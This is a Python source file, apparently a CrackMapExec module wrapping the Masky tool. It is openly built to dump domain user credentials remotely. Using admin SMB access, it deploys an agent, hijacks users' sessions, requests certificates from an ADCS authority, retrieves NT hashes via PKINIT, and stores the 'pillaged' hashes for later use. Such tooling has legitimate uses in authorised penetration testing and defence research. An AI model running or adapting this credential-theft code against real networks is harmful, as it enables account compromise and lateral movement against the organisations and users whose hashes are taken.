#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from masky import Masky
from cme.helpers.bloodhound import add_user_bh


class CMEModule:
    name = "masky"
    description = "Remotely dump domain user credentials via an ADCS and a KDC"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        CA              Certificate Authority Name (CA_SERVER\CA_NAME)
        TEMPLATE        Template name allowing users to authenticate with (default: User)
        DC_IP           IP Address of the domain controller
        AGENT_EXE       Path to a custom executable masky agent to be deployed
        """
        self.template = "User"
        self.ca = None
        self.dc_ip = None
        self.agent_exe = None
        self.file_args = False

        if "CA" in module_options:
            self.ca = module_options["CA"]

        if "TEMPLATE" in module_options:
            self.template = module_options["TEMPLATE"]

        if "DC_IP" in module_options:
            self.dc_ip = module_options["DC_IP"]

        if "AGENT_EXE" in module_options:
            self.agent_exe = module_options["AGENT_EXE"]
            self.file_args = True

    def on_admin_login(self, context, connection):
        if not self.ca:
            context.log.fail("Please provide a valid CA server and CA name (CA_SERVER\CA_NAME)")
            return False

        host = connection.host
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        m = Masky(
            ca=self.ca,
            template=self.template,
            user=username,
            dc_ip=self.dc_ip,
            domain=domain,
            password=password,
            hashes=f"{lmhash}:{nthash}",
            kerberos=kerberos,
            exe_path=self.agent_exe,
            file_args=self.file_args,
        )

        context.log.display("Running Masky on the targeted host")
        rslts = m.run(host)
        tracker = m.get_last_tracker()

        self.process_results(connection, context, rslts, tracker)

        return self.process_errors(context, tracker)

    def process_results(self, connection, context, rslts, tracker):
        if not tracker.nb_hijacked_users:
            context.log.display("No users' sessions were hijacked")
        else:
            context.log.display(f"{tracker.nb_hijacked_users} session(s) successfully hijacked")
            context.log.display("Attempting to retrieve NT hash(es) via PKINIT")

        if not rslts:
            return False

        pwned_users = 0
        for user in rslts.users:
            if user.nthash:
                context.log.highlight(f"{user.domain}\{user.name} {user.nthash}")
                self.process_credentials(connection, context, user)
                pwned_users += 1

        if pwned_users:
            context.log.success(f"{pwned_users} NT hash(es) successfully collected")
        else:
            context.log.fail("Unable to collect NT hash(es) from the hijacked session(s)")
        return True

    def process_credentials(self, connection, context, user):
        host = context.db.get_hosts(connection.host)[0][0]
        context.db.add_credential(
            "hash",
            user.domain,
            user.name,
            user.nthash,
            pillaged_from=host,
        )
        add_user_bh(user.name, user.domain, context.log, connection.config)

    def process_errors(self, context, tracker):
        ret = True

        if tracker.last_error_msg:
            context.log.fail(tracker.last_error_msg)
            ret = False

        if not tracker.files_cleaning_success:
            context.log.fail("Fail to clean files related to Masky")
            context.log.fail((f"Please remove the files named '{tracker.agent_filename}', '{tracker.error_filename}', " f"'{tracker.output_filename}' & '{tracker.args_filename}' within the folder '\\Windows\\Temp\\'"))
            ret = False

        if not tracker.svc_cleaning_success:
            context.log.fail(f"Fail to remove the service named '{tracker.svc_name}', please remove it manually")
            ret = False
        return ret
